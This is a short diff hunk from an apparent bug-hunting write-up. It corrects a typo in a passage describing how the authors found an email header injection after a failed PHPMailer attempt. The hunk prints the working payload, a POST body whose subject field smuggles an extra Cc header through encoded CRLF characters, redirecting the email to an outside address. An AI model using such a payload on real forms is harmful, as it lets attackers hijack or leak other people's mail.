@@ -33,7 +33,7 @@ when we login we get this page
 here me and my team start think about phpmailer bug , but not work after some test 
 
 then after some check we get that its email header injection that make us able to redirect the email to our account :D 
-look amazing new here :D 
+look amazing now here :D 
 
 this is our payload used : 
 POST : subject=Report+from+16-07-2017+12-18%0d%0aCc:email@gmail.com%0d%0a&encoding=UTF-8
